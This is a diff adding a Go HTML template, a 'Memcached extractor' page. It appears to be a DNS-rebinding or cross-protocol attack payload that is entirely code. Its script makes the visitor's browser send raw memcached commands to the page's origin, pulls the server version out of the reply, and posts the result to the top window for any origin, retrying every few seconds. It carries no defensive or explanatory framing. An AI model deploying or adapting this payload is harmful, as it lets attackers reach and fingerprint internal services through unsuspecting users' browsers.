@@ -1,0 +1,34 @@
+<%! func MemcachedExtract(w io.Writer) error %>
+<html>
+<head>
+  <title>Memcached extractor</title>
+</head>
+<body>
+  <pre id="result"></pre>
+  <script>
+    function poll() {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", document.location.origin);
+      xhr.setRequestHeader("Content-Type", "text/plain");
+      xhr.overrideMimeType("text/plain");
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState !== 4) {
+          return;
+        }
+        if (xhr.status === 200) {
+          var response = xhr.response;
+          var version = /^STAT version (.*)$/gm.exec(response)[1];
+          window.top.postMessage("You're running memcached version " + version, '*');
+        } else if (xhr.status === 404) {
+          window.top.postMessage(".", '*');
+          setTimeout(poll, 5000);
+        } else {
+          window.top.postMessage("You don't seem to be running memcached", '*');
+        }
+      };
+      xhr.send("stats\r\nversion\r\nquit\r\n");
+    }
+    setTimeout(poll, 5000);
+  </script>
+</body>
+</html>
